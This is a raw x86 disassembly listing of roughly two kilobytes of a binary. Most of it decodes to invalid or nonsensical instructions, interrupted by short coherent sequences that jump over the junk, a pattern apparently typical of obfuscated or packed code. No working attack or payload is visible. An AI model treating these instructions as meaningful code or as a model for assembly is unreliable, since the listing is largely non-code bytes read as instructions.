  4133e0:	cmp    BYTE PTR [edx+0x1f],0xae
  4133e4:	xchg   esp,eax
  4133e5:	shl    ah,cl
  4133e7:	fbstp  TBYTE PTR [ecx+0x2ea4a602]
  4133ed:	in     eax,0xb0
  4133ef:	jae    0x41342e
  4133f1:	lods   al,BYTE PTR ds:[esi]
  4133f2:	fwait
  4133f3:	not    ebx
  4133f5:	fisttp WORD PTR [esi+0x1b]
  4133f8:	imul   DWORD PTR [edi+0x1b]
  4133fb:	push   ds
  4133fc:	in     eax,dx
  4133fd:	lea    ebp,[edx+esi*4-0x79]
  413401:	jo     0x4133f9
  413403:	iret   
  413404:	cld    
  413405:	mov    ah,0x2b
  413407:	test   eax,0xc2a1fec6
  41340c:	or     eax,0x871d58ea
  413411:	sbb    eax,0x2ba109b6
  413416:	push   edx
  413417:	(bad)  
  413418:	rcl    BYTE PTR [eax+0x15],cl
  41341b:	mov    DWORD PTR [ebp+0x532169d0],esp
  413421:	cli    
  413422:	cmp    eax,0x8671bd18
  413427:	xor    edx,DWORD PTR [ebx]
  413429:	fdiv   DWORD PTR [esi+0x24]
  41342c:	push   0xffffff87
  41342e:	fdivrp st(7),st
  413430:	test   DWORD PTR [edi+0x65],eax
  413433:	xchg   ebx,eax
  413434:	loope  0x41341c
  413436:	mov    ebp,0x4f63c71e
  41343b:	sub    eax,0x7d03081a
  413440:	in     al,dx
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x5c688b5e
  41345f:	jp     0x4134a4
  413461:	js     0x4134e2
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x41341b
  413469:	cmp    eax,0xff4f72d4
  41346e:	aam    0x65
  413470:	pusha  
  413471:	sub    BYTE PTR [edi+ecx*1],ah
  413474:	push   edx
  413475:	packssdw mm2,QWORD PTR [edi+ebp*4]
  413479:	pop    ss
  41347a:	xor    eax,0x8e875314
  41347f:	sbb    BYTE PTR [eax-0x1f],bh
  413482:	pop    es
  413483:	jno    0x413475
  413485:	mov    WORD PTR [esp+ebp*8+0x77fe4479],ds
  41348c:	adc    al,0x52
  41348e:	xor    eax,0x1c3d6a58
  413493:	xor    BYTE PTR [ecx],al
  413495:	in     al,0x66
  413497:	rcl    BYTE PTR [esi+eax*2-0x7a97b2b4],cl
  41349e:	test   DWORD PTR [ebp-0x7f],0x75aee1c4
  4134a5:	jno    0x413458
  4134a7:	fwait
  4134a8:	xchg   edx,eax
  4134a9:	popa   
  4134aa:	nop
  4134ab:	mov    edi,0x53d7bc1
  4134b0:	mov    al,ds:0x6ddf85f
  4134b5:	ins    DWORD PTR es:[edi],dx
  4134b6:	daa    
  4134b7:	adc    BYTE PTR [ebx-0x3fd42864],dh
  4134bd:	jmp    0xc188:0x52894b19
  4134c4:	loope  0x413497
  4134c6:	not    DWORD PTR [edi+0x68]
  4134c9:	shr    BYTE PTR [eax+0x6ad8137a],0x33
  4134d0:	retf   0xd86b
  4134d3:	adc    eax,0x7bf31931
  4134d8:	mov    dh,0x65
  4134da:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134dc:	push   eax
  4134dd:	or     al,0xea
  4134df:	jo     0x4134f4
  4134e1:	in     al,dx
  4134e2:	sbb    bl,BYTE PTR [eax+0x19]
  4134e5:	sub    al,0x0
  4134e7:	or     edx,DWORD PTR [edx+0x6a]
  4134ea:	add    ecx,esi
  4134ec:	aaa    
  4134ed:	dec    edx
  4134ee:	sbb    esi,DWORD PTR [ebx-0x15d0e1ac]
  4134f4:	xchg   BYTE PTR [edx-0x4b],bl
  4134f7:	add    bh,BYTE PTR [eax+0x48d759aa]
  4134fd:	arpl   WORD PTR [ecx+ecx*4-0x2b],si
  413501:	fmul   DWORD PTR [edi-0x184fe391]
  413507:	jmp    0x413550
  413509:	cmc    
  41350a:	pusha  
  41350b:	sti    
  41350c:	and    dh,BYTE PTR [eax]
  41350e:	(bad)  
  41350f:	mov    ds:0x7e34fcf9,al
  413514:	and    al,BYTE PTR [edx+edi*4+0x68]
  413518:	fisubr WORD PTR [edx-0x3c84677f]
  41351e:	mov    cl,0x97
  413520:	sbb    BYTE PTR [esi-0x6f2ae2c2],ah
  413526:	test   DWORD PTR [edi-0x10],0x655fd006
  41352d:	pop    ebp
  41352e:	and    dh,dl
  413530:	jns    0x4134d3
  413532:	retf   0x908f
  413535:	mov    cl,ah
  413537:	aad    0xb2
  413539:	dec    esi
  41353a:	ja     0x41352a
  41353c:	out    0x8f,eax
  41353e:	pop    ds
  41353f:	scas   eax,DWORD PTR es:[edi]
  413540:	xchg   ecx,eax
  413541:	popa   
  413542:	das    
  413543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413544:	sbb    eax,0xa0dca337
  413549:	icebp  
  41354a:	pop    ss
  41354b:	fs lahf 
  41354d:	sub    dl,al
  41354f:	and    DWORD PTR [edi],edi
  413551:	das    
  413552:	cld    
  413553:	mov    ebp,0x766712f
  413558:	inc    eax
  413559:	xchg   ecx,eax
  41355a:	adc    al,0x3e
  41355c:	jnp    0x4135a7
  41355e:	inc    esp
  41355f:	inc    esi
  413560:	sar    DWORD PTR [ebx],1
  413562:	push   es
  413563:	inc    eax
  413564:	mov    dh,0x6b
  413566:	call   DWORD PTR [ebp-0x1e28ea3d]
  41356c:	sub    DWORD PTR [edx+eax*1-0x43d4420b],esi
  413573:	leave  
  413574:	out    0xcf,eax
  413576:	push   esp
  413577:	or     al,0xb9
  413579:	mov    dl,0x6b
  41357b:	out    0xb,eax
  41357d:	push   ebx
  41357e:	test   cl,0xcd
  413581:	jmp    0xd65d:0x7a4bd384
  413588:	pop    edi
  413589:	ret    
  41358a:	enter  0xcb4c,0x7b
  41358e:	dec    esi
  41358f:	jp     0x413603
  413591:	nop
  413592:	adc    al,0x1f
  413594:	push   cs
  413595:	cmc    
  413596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413597:	add    esi,DWORD PTR [ebx]
  413599:	ja     0x413525
  41359b:	das    
  41359c:	les    edi,FWORD PTR [eax-0x32294eb6]
  4135a2:	outs   dx,BYTE PTR ds:[esi]
  4135a3:	push   ss
  4135a4:	iret   
  4135a5:	(bad)  
  4135a6:	outs   dx,BYTE PTR ds:[esi]
  4135a7:	dec    esi
  4135a8:	adc    DWORD PTR [ecx+ecx*4+0x4165262f],esi
  4135af:	dec    ecx
  4135b0:	inc    esp
  4135b1:	jns    0x413563
  4135b3:	repz les esi,FWORD PTR [edx-0x57]
  4135b7:	lahf   
  4135b8:	dec    ebx
  4135b9:	xor    eax,0x55b6e466
  4135be:	mov    WORD PTR [edx+0x2ea2deb1],es
  4135c4:	push   ss
  4135c5:	outs   dx,DWORD PTR ds:[esi]
  4135c6:	adc    al,0xfe
  4135c8:	rcr    edi,0xd0
  4135cb:	pop    esp
  4135cc:	loop   0x41355f
  4135ce:	idiv   BYTE PTR [edi+0x47]
  4135d1:	jno    0x4135e6
  4135d3:	lea    eax,[ebx+0x16]
  4135d6:	loop   0x41361d
  4135d8:	mov    edi,0x2cd0ef43
  4135dd:	cdq    
  4135de:	pop    ss
  4135df:	adc    DWORD PTR [esi],ebx
  4135e1:	popa   
  4135e2:	push   ss
  4135e3:	stc    
  4135e4:	mov    ds:0xd490ab41,eax
  4135e9:	cmp    al,0xfa
  4135eb:	rcl    BYTE PTR [edi+esi*8+0x6181cd61],1
  4135f2:	cmp    al,0x7f
  4135f4:	fisub  DWORD PTR [eax-0x11]
  4135f7:	sub    BYTE PTR [ebp+eiz*2+0x1d],bl
  4135fb:	pop    ecx
  4135fc:	and    ebx,DWORD PTR [edi+0x451741c5]
  413602:	mov    ss,WORD PTR [esp+edx*4-0x33]
  413606:	pop    es
  413607:	imul   esi,DWORD PTR [edi],0x9ecbd829
  41360d:	popf   
  41360e:	rcr    BYTE PTR [esi+ebx*8],cl
  413611:	jl     0x413643
  413613:	adc    BYTE PTR [eax-0x3ab19b4e],cl
  413619:	push   esp
  41361a:	and    eax,0x297d6e0a
  41361f:	out    dx,eax
  413620:	xchg   edx,eax
  413621:	lahf   
  413622:	mov    WORD PTR [bx+si],?
  413625:	jb     0x4135fb
  413627:	or     bl,ch
  413629:	ins    DWORD PTR es:[edi],dx
  41362a:	ins    DWORD PTR es:[edi],dx
  41362b:	aas    
  41362c:	inc    ecx
  41362d:	into   
  41362e:	mov    ebp,0x7e74cb17
  413633:	mov    edx,0xdacfd032
  413638:	or     eax,0x8efa3f21
  41363d:	cmp    al,0xf9
  41363f:	dec    esp
  413640:	push   ebp
  413641:	cmc    
  413642:	cmp    al,0x67
  413644:	push   ebp
  413645:	mov    ds:0x15352bc3,eax
  41364a:	or     bl,BYTE PTR ds:0x2557ef2d
  413650:	mov    bl,0xe6
  413652:	cmp    eax,0x215a8711
  413657:	push   ebx
  413658:	pop    ebp
  413659:	push   ss
  41365a:	mov    ch,0xcd
  41365c:	nop
  41365d:	or     DWORD PTR [esi-0x23a563df],0xfffffff9
  413664:	out    0xb,al
  413666:	jp     0x413669
  413668:	into   
  413669:	pop    eax
  41366a:	call   0x43aef22
  41366f:	test   al,0x55
  413671:	jb     0x4136d2
  413673:	mov    ecx,0x6f417fca
  413678:	mov    edx,0x338b460
  41367d:	sti    
  41367e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41367f:	test   al,0x58
  413681:	jne    0x4136be
  413683:	mov    bh,BYTE PTR [ebp+0x2a]
  413686:	rcl    DWORD PTR [ebp+0x1e368277],0x90
  41368d:	dec    esp
  41368e:	dec    edi
  41368f:	lahf   
  413690:	aad    0x62
  413692:	fcom   QWORD PTR [edx]
  413694:	lock bound edx,QWORD PTR [edi]
  413697:	dec    esp
  413698:	test   dh,dl
  41369a:	push   esi
  41369b:	(bad)  
  41369d:	xchg   edi,eax
  41369e:	xor    bl,BYTE PTR [eax]
  4136a0:	imul   edx,DWORD PTR [ecx-0x635e4c0],0xfffffff7
  4136a7:	mov    cl,0xb2
  4136a9:	jae    0x41371f
  4136ab:	jecxz  0x413655
  4136ad:	scas   eax,DWORD PTR es:[edi]
  4136ae:	mov    esp,?
  4136b0:	jne    0x41367d
  4136b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b3:	mov    ah,0xe3
  4136b5:	push   es
  4136b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b7:	mov    bh,0x7c
  4136b9:	(bad)  
  4136ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136bb:	lods   eax,DWORD PTR ds:[esi]
  4136bc:	nop
  4136bd:	iret   
  4136be:	imul   ebp,DWORD PTR ds:0x6850503c,0x67
  4136c5:	mov    esi,0x2a1b0155
  4136ca:	nop
  4136cb:	jnp    0x41366f
  4136cd:	in     eax,0xbc
  4136cf:	loop   0x413735
  4136d1:	xchg   ecx,eax
  4136d2:	xchg   esp,eax
  4136d3:	mov    edx,DWORD PTR [ebp-0x44]
  4136d6:	mov    edi,DWORD PTR [ebp-0xc]
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp+0x4e317219]
  4136f4:	fs sub BYTE PTR ds:[ebp+0x7f],bh
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x41374b
  4136ff:	cmp    esp,edx
  413701:	push   cs
  413702:	jo     0x4136dd
  413704:	fstp   TBYTE PTR [esi+0x6ac95ec3]
  41370a:	pop    edx
  41370b:	or     eax,0x14b1e7f4
  413710:	mov    edx,0x7be93d84
  413715:	mov    dl,0x62
  413717:	aad    0x3c
  413719:	push   0xffffffe4
  41371b:	mov    eax,0x49c81200
  413720:	and    DWORD PTR [edi],ebx
  413722:	mov    bl,0x68
  413724:	call   FWORD PTR [edi+esi*2]
  413727:	shl    DWORD PTR [ebx-0x34f7bc4],cl
  41372d:	jbe    0x413789
  41372f:	push   ebx
  413730:	dec    edx
  413731:	lea    ebp,[ebp+0x54]
  413734:	lahf   
  413735:	xor    eax,DWORD PTR [ebp+0x35]
  413738:	clc    
  413739:	je     0x4136f0
  41373b:	xchg   ebx,eax
  41373c:	mov    WORD PTR [eax],cs
  41373e:	cmp    BYTE PTR [edx],ch
  413740:	pushf  
  413741:	cmc    
  413742:	mov    esp,0x940ffd0e
  413747:	mov    esp,0xc1b757aa
  41374c:	sti    
  41374d:	fld    QWORD PTR [ecx-0x62]
  413750:	mov    ds:0x3f2edbb8,eax
  413755:	cld    
  413756:	jbe    0x413708
  413758:	add    DWORD PTR es:[eax+ebp*2],edx
  41375c:	and    cl,BYTE PTR [ebp+0x11]
  41375f:	lock cdq 
  413761:	mov    cl,0x8a
  413763:	lea    ebx,[edx]
  413765:	cli    
  413766:	out    dx,al
  413767:	mov    esi,0x9f023421
  41376c:	mov    ch,0x6f
  41376e:	jns    0x41370a
  413770:	int3   
  413771:	clc    
  413772:	repnz icebp 
  413774:	push   esp
  413775:	imul   BYTE PTR [ebp+0x41]
  413778:	or     eax,0x1db4b6be
  41377d:	ins    DWORD PTR es:[edi],dx
  41377e:	push   ecx
  41377f:	sbb    DWORD PTR [ecx],0x9
  413782:	push   cs
  413783:	call   0x37f1df6c
  413788:	or     eax,0xc7eb1b90
  41378d:	xor    eax,0xb23060a3
  413792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413793:	inc    esp
  413794:	jns    0x41371b
  413796:	add    eax,0x7985275b
  41379b:	out    dx,al
  41379c:	clc    
  41379d:	and    eax,0x4b419ba8
  4137a2:	xchg   esi,eax
  4137a3:	lods   eax,DWORD PTR ds:[esi]
  4137a4:	repz push ss
  4137a6:	sti    
  4137a7:	pop    esi
  4137a8:	pop    eax
  4137a9:	pop    ebp
  4137aa:	xchg   esi,eax
  4137ac:	jb     0x41379e
  4137ae:	sar    DWORD PTR [ebx+edx*8-0x68],0x1a
  4137b3:	push   edx
  4137b4:	mov    ah,0xec
  4137b6:	inc    eax
  4137b7:	pop    ss
  4137b8:	imul   ebp,esp,0x259f5f78
  4137be:	xchg   edx,eax
  4137bf:	mov    ebx,0x6a24a863
  4137c4:	sub    eax,0x309c7f86
  4137c9:	push   ecx
  4137ca:	jne    0x4137e1
  4137cc:	sbb    DWORD PTR [esi+esi*1],ebx
  4137cf:	les    ebx,FWORD PTR [edi+0x525c0955]
  4137d5:	mov    ah,0x43
  4137d7:	sti    
  4137d8:	push   ecx
  4137d9:	mov    eax,ds:0xf2cab469
  4137de:	mov    bl,0xb6
  4137e0:	loope  0x4137be
  4137e2:	pusha  
  4137e3:	js     0x413860
  4137e5:	add    eax,0x7bb0d2b4
  4137ea:	test   BYTE PTR [ebp+ecx*1+0x67760ea5],cl
  4137f1:	imul   edi,DWORD PTR ds:[esi+ebx*8-0xd],0x778e8e5b
  4137fa:	ins    DWORD PTR es:[edi],dx
  4137fb:	push   edi
  4137fc:	inc    edi
  4137fd:	sbb    DWORD PTR [esi+0x351a69bc],ebx
  413803:	inc    esp
  413804:	fstp   DWORD PTR [edi+ebp*2]
  413807:	cmp    al,0x80
  413809:	popf   
  41380a:	xor    al,0x82
  41380c:	scas   al,BYTE PTR es:[edi]
  41380d:	dec    edi
  41380e:	pop    edi
  41380f:	shr    esi,cl
  413811:	outs   dx,DWORD PTR ds:[esi]
  413812:	xchg   edi,eax
  413813:	rol    dh,cl
  413815:	pop    esp
  413816:	mov    BYTE PTR [ebp+0x65],al
  413819:	sub    BYTE PTR [eax+eax*4-0x80],dh
  41381d:	test   eax,0x7ad72d25
  413823:	and    eax,DWORD PTR [ebx-0x7303a4b0]
  413829:	push   ebp
  41382a:	xchg   BYTE PTR [esi],ch
  41382c:	add    dl,BYTE PTR [edx+edi*8+0x56244eb3]
  413833:	inc    edi
  413834:	test   eax,0x92f98aab
  413839:	pop    es
  41383a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41383b:	shl    ebx,0xf1
  41383e:	enter  0xf0ff,0xd8
  413842:	inc    edx
  413843:	ret    
  413844:	lds    edi,FWORD PTR [esi]
  413846:	push   esp
  413847:	add    al,0x47
  413849:	xchg   esp,eax
  41384a:	push   esi
  41384b:	test   DWORD PTR [ecx],ebp
  41384d:	xchg   ebp,eax
  41384e:	cli    
  41384f:	enter  0x3a6c,0x58
  413853:	mov    cl,0x25
  413855:	scas   al,BYTE PTR es:[edi]
  413856:	out    dx,eax
  413857:	push   0x487893c8
  41385c:	mov    bh,0x8d
  41385e:	pop    es
  41385f:	aam    0x88
  413861:	stc    
  413862:	(bad)  [eax+0x62]
  413865:	fsub   DWORD PTR [edx+ebx*1]
  413868:	and    ebp,DWORD PTR [edx]
  41386a:	dec    ebx
  41386b:	(bad)  [edx+0x6b8c10ba]
  413871:	ret    
  413872:	dec    ebp
  413873:	lods   al,BYTE PTR cs:[esi]
  413875:	shl    cl,0x99
  413878:	inc    eax
  413879:	clc    
  41387a:	mov    esp,0xbfdad427
  41387f:	pusha  
  413880:	popa   
  413881:	in     al,0xae
  413883:	adc    BYTE PTR [eax-0x1a851654],al
  413889:	imul   ebx,esp,0xf31bd5c
  41388f:	dec    eax
  413890:	test   DWORD PTR [ebx-0x77c36f6f],edx
  413896:	dec    esi
  413897:	and    DWORD PTR [ecx],0x304f2a7d
  41389d:	in     al,dx
  41389e:	cmc    
  41389f:	xchg   BYTE PTR [eax+eiz*2],al
  4138a2:	jg     0x4138ef
  4138a4:	call   0x828d:0x6914e3b0
  4138ab:	ret    0xf1db
  4138ae:	pop    edi
  4138af:	mov    ds:0xb91ce371,al
  4138b4:	pop    ebx
  4138b5:	addr16 popf 
  4138b7:	mov    ah,BYTE PTR [esi+0x3f]
  4138ba:	fwait
  4138bb:	leave  
  4138bc:	ja     0x4138bd
  4138be:	fistp  DWORD PTR [edx]
  4138c0:	pop    ebp
  4138c1:	pop    esi
  4138c2:	jb     0x4138da
  4138c4:	pop    eax
  4138c5:	cmp    eax,0x1760fae4
  4138ca:	mov    WORD PTR [edx],cs
  4138cc:	adc    eax,0x9bfec928
  4138d1:	pusha  
  4138d2:	scas   eax,DWORD PTR es:[edi]
  4138d3:	inc    ebx
  4138d4:	pop    edi
  4138d5:	sbb    eax,edi
  4138d7:	mov    esp,0xea320873
  4138dc:	dec    ebx
  4138dd:	popf   
  4138de:	or     DWORD PTR [ebx-0x459d07ba],eax
  4138e4:	or     al,0x36
  4138e6:	aam    0x4a
  4138e8:	rol    edx,1
  4138ea:	pop    ds
  4138eb:	pop    es
  4138ec:	cmp    DWORD PTR [eax],edx
  4138ee:	div    cl
  4138f0:	or     al,0xba
  4138f2:	test   al,0x11
  4138f4:	fstp   QWORD PTR [esi+0x46]
  4138f7:	sub    ebp,edi
  4138f9:	std    
  4138fa:	inc    ecx
  4138fb:	mov    BYTE PTR [edx+0x555c65ba],ah
  413901:	dec    eax
  413902:	rdmsr  
  413904:	hlt    
  413905:	mov    dl,0xec
  413907:	push   esp
  413908:	inc    edi
  413909:	shr    DWORD PTR [edx-0x4d],1
  41390c:	sub    DWORD PTR [eax+0x51],eax
  41390f:	sub    DWORD PTR [ebx+0x34],ebx
  413912:	cmc    
  413913:	push   edi
  413914:	fcmovu st,st(6)
  413916:	stc    
  413917:	sub    al,0x77
  413919:	cmp    BYTE PTR [ecx+0x0],ch
  41391c:	rcl    BYTE PTR [ebp-0x675082c6],1
  413922:	mov    edx,0x9653ca03
  413927:	inc    esp
  413928:	jg     0x4138d8
  41392a:	into   
  41392b:	pop    esi
  41392c:	shl    dl,0x4e
  41392f:	fadd   DWORD PTR [esp+edi*4]
  413932:	mul    BYTE PTR [eax+0x3682dc08]
  413938:	rcl    DWORD PTR [ebp-0x63d7a1a2],1
  41393e:	in     al,0xc2
  413940:	ficomp DWORD PTR [edx+ecx*4+0x3f]
  413944:	enter  0xab53,0xc7
  413948:	mov    BYTE PTR [esi-0x44],al
  41394b:	ins    DWORD PTR es:[edi],dx
  41394c:	(bad)  
  41394d:	shl    ecx,1
  41394f:	inc    ecx
  413950:	into   
  413951:	sbb    BYTE PTR [ecx+eax*2+0x6c],al
  413955:	rcl    DWORD PTR [eax+eiz*2+0x7e665a67],cl
  41395c:	jbe    0x41390f
  41395e:	ret    0xd56
  413961:	(bad)  [esi+0x319ea59a]
  413967:	loop   0x4139a6
  413969:	imul   edx,edi
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x4139c0
  413996:	mov    ds:0x3953748,al
  41399b:	jg     0x413a15
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	mov    eax,0x5a2f26a3
  4139a6:	mov    ah,0x9
  4139a8:	mov    esi,0xf8e1b246
  4139ad:	hlt    
  4139ae:	jae    0x41398d
  4139b0:	shl    BYTE PTR [esi+0x11],1
  4139b3:	adc    BYTE PTR [ebx+0x39580dd5],ch
  4139b9:	fstp   QWORD PTR [edi+0x492c6e85]
  4139bf:	sub    BYTE PTR [esi],al
  4139c1:	mov    ebp,0x87e0a7ba
  4139c6:	dec    esi
  4139c7:	rol    BYTE PTR [edx],cl
  4139c9:	ja     0x413a2b
  4139cb:	nop
  4139cc:	aaa    
  4139cd:	lahf   
  4139ce:	mov    al,0xf3
  4139d0:	arpl   WORD PTR [ebp+0x4d],si
  4139d3:	mov    edx,0x405f7687
  4139d8:	loopne 0x4139fd
  4139da:	in     eax,0xff
  4139dc:	jg     0x413962
  4139de:	mov    esi,0x8538d151
  4139e3:	add    ch,dl
  4139e5:	ret    0x3fcd
  4139e8:	ja     0x4139c0
  4139ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139eb:	dec    ebp
  4139ec:	in     eax,dx
  4139ed:	loop   0x413a36
  4139ef:	or     al,BYTE PTR [eax-0x73d1805c]
  4139f5:	push   edi
  4139f6:	mov    DWORD PTR [edi+0x48],esi
  4139f9:	in     eax,dx
  4139fa:	dec    eax
  4139fb:	imul   esi,edx,0x4d
  4139fe:	es sbb al,0xcf
  413a01:	mov    al,ds:0x872a7305
  413a06:	mov    al,ds:0x618a84af
  413a0b:	inc    ecx
  413a0c:	or     BYTE PTR [esi+0x1f],0x9e
  413a10:	loopne 0x4139bf
  413a12:	xor    DWORD PTR gs:[eax],ebp
  413a15:	loop   0x4139ff
  413a17:	sub    ecx,DWORD PTR es:[esi-0x4c]
  413a1b:	aaa    
  413a1c:	xlat   BYTE PTR ds:[ebx]
  413a1d:	sbb    DWORD PTR [eax+0x4c],ebx
  413a20:	mov    dh,0x5e
  413a22:	test   ah,cl
  413a24:	mov    ch,0x4f
  413a26:	xchg   esp,eax
  413a27:	fcom   QWORD PTR [esi-0xcca8e28]
  413a2d:	and    eax,0xdd4ac6ad
  413a32:	repz xor eax,0xa2702056
  413a38:	mov    dl,0x81
  413a3a:	cmp    ch,BYTE PTR ds:0x55ae551d
  413a40:	sbb    ch,BYTE PTR [edi+0x2bdb56b6]
  413a46:	cli    
  413a47:	int3   
  413a48:	push   edi
  413a49:	ins    BYTE PTR es:[edi],dx
  413a4a:	inc    ebp
  413a4b:	xchg   DWORD PTR [esi-0x37],edx
  413a4e:	jecxz  0x4139fa
  413a50:	inc    ecx
  413a51:	fwait
  413a52:	int    0x1a
  413a54:	pop    edx
  413a55:	adc    DWORD PTR [ecx+0x28],edi
  413a58:	pop    es
  413a59:	ret    
  413a5a:	fnstsw WORD PTR [esi-0x263ca8b4]
  413a60:	xchg   BYTE PTR [ecx+0x71113da6],dl
  413a66:	cli    
  413a67:	push   DWORD PTR [ebp+ebp*1-0x69]
  413a6b:	push   esp
  413a6c:	stos   BYTE PTR es:[edi],al
  413a6d:	and    eax,DWORD PTR [ebp-0x10cfabda]
  413a73:	sub    DWORD PTR [ecx-0x31fde6f],ebp
  413a79:	movlps xmm2,QWORD PTR ds:0x27eba024
  413a80:	cmp    dh,bh
  413a82:	pop    es
  413a83:	sbb    al,0xe2
  413a85:	inc    esp
  413a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a87:	inc    eax
  413a88:	pop    ecx
  413a89:	xchg   ebx,eax
  413a8a:	scas   eax,DWORD PTR es:[edi]
  413a8b:	lock pop ebp
  413a8d:	pop    ecx
  413a8e:	(bad)  
  413a8f:	push   edi
  413a90:	push   esp
  413a91:	xchg   ecx,eax
  413a92:	clc    
  413a93:	(bad)
  413a97:	dec    edi
  413a98:	or     dh,ah
  413a9a:	push   ds
  413a9b:	enter  0xe5e8,0x37
  413a9f:	into   
  413aa0:	lock adc DWORD PTR [eax],edx
  413aa3:	imul   edi,DWORD PTR ds:0xf176b572,0xffffff9f
  413aaa:	xchg   DWORD PTR [ebx+eax*8-0x32],edi
  413aae:	sub    DWORD PTR [edi+ecx*8],ecx
  413ab1:	sbb    DWORD PTR [eax+0x4d310ed5],eax
  413ab7:	data16 mov ah,BYTE PTR [eax-0x6dab96cf]
  413abe:	in     al,dx
  413abf:	push   eax
  413ac0:	mov    ds:0x5fc94d09,eax
  413ac5:	popf   
  413ac6:	jae    0x413a51
  413ac8:	out    dx,al
  413ac9:	sub    ecx,DWORD PTR [eax]
  413acb:	inc    esp
  413acc:	mov    dh,0x24
  413ace:	cmp    BYTE PTR [eax],0xf7
  413ad1:	add    BYTE PTR [eax],al
  413ad3:	sbb    DWORD PTR [esi],ebx
  413ad5:	or     eax,0x86ad5751
  413ada:	arpl   WORD PTR [ebx-0x4f87459e],bp
  413ae0:	lea    edx,[ebp+0x13083ef8]
  413ae6:	hlt    
  413ae7:	sbb    dh,ah
  413ae9:	pop    esi
  413aea:	cmp    edx,DWORD PTR ds:0x44d06e19
  413af0:	inc    ebp
  413af1:	and    al,0xa1
  413af3:	in     eax,dx
  413af4:	nop
  413af5:	push   0x25c831d8
  413afa:	stos   DWORD PTR es:[edi],eax
  413afb:	outs   dx,DWORD PTR ds:[esi]
  413afc:	(bad)  
  413afd:	cmp    edi,DWORD PTR [edx+0x7fbc7e8c]
  413b03:	jle    0x413b31
  413b05:	ficomp WORD PTR [ebp+0x3bed153c]
  413b0b:	aam    0xd
  413b0d:	aad    0x65
  413b0f:	lea    esi,[edx+0x8c5a124]
  413b15:	add    eax,0x6985572a
  413b1a:	pand   mm0,QWORD PTR [edx+0x8]
  413b1e:	stc    
  413b1f:	sbb    al,0xd3
  413b21:	cmp    eax,0xaad96144
  413b26:	imul   edi,esp,0xf124446d
  413b2c:	jnp    0x413ba8
  413b2e:	dec    eax
  413b2f:	push   cs
  413b30:	pop    edi
  413b31:	stos   BYTE PTR es:[edi],al
  413b32:	sub    DWORD PTR [edx],edi
  413b34:	inc    bx
  413b36:	mov    dh,0x22
  413b38:	(bad)  
  413b39:	push   eax
  413b3a:	(bad)  
  413b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b3c:	imul   esi,DWORD PTR [ecx],0x58
  413b3f:	int3   
  413b40:	jne    0x413ac4
  413b42:	daa    
  413b43:	loop   0x413b24
  413b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b46:	push   ebp
  413b47:	jmp    0xb3f9:0xa2acaba7
  413b4e:	and    edi,ecx
  413b50:	jo     0x413b29
  413b52:	xor    ch,0xf5
  413b55:	in     eax,dx
  413b56:	jbe    0x413ba7
  413b58:	mov    ecx,0xe4da419e
  413b5d:	fiadd  WORD PTR [edi-0x527930f8]
  413b63:	test   al,0x4c
  413b65:	mov    ah,bl
  413b67:	pop    ecx
  413b68:	lods   al,BYTE PTR ds:[esi]
  413b69:	ret    
  413b6a:	out    0x21,eax
  413b6c:	or     DWORD PTR [edx-0x78],ecx
  413b6f:	xchg   esi,eax
  413b70:	out    dx,al
  413b71:	mov    ch,0xd5
  413b73:	sub    eax,0xb3af25d6
  413b78:	sub    esp,edx
  413b7a:	and    ebx,DWORD PTR ds:0xa65a21d5
  413b80:	jnp    0x413b5e
  413b82:	fsub   DWORD PTR [edi]
  413b84:	les    ecx,FWORD PTR [eax-0x6a54a707]
  413b8a:	xor    ebp,DWORD PTR [esi+0x7a]
  413b8d:	or     al,0x39
  413b8f:	in     eax,0x69
  413b91:	and    edi,ebp
  413b93:	aam    0x25
  413b95:	ss pop edx
  413b97:	mov    ch,0x32
  413b99:	inc    ebx
  413b9a:	xchg   ecx,eax
  413b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b9c:	xor    DWORD PTR [eax+0x67],edx
  413b9f:	dec    edi
  413ba0:	xchg   ebp,eax
  413ba1:	ss push 0x3e
  413ba4:	pushf  
  413ba5:	xor    DWORD PTR [edi+ebx*2+0xf],0xb9990da2
  413bad:	inc    edi
  413bae:	das    
  413baf:	push   ebp
  413bb0:	push   edi
  413bb1:	cli    
  413bb2:	ret    
  413bb3:	pop    esi
  413bb4:	shl    DWORD PTR [ecx],cl
  413bb6:	jb     0x413ba6
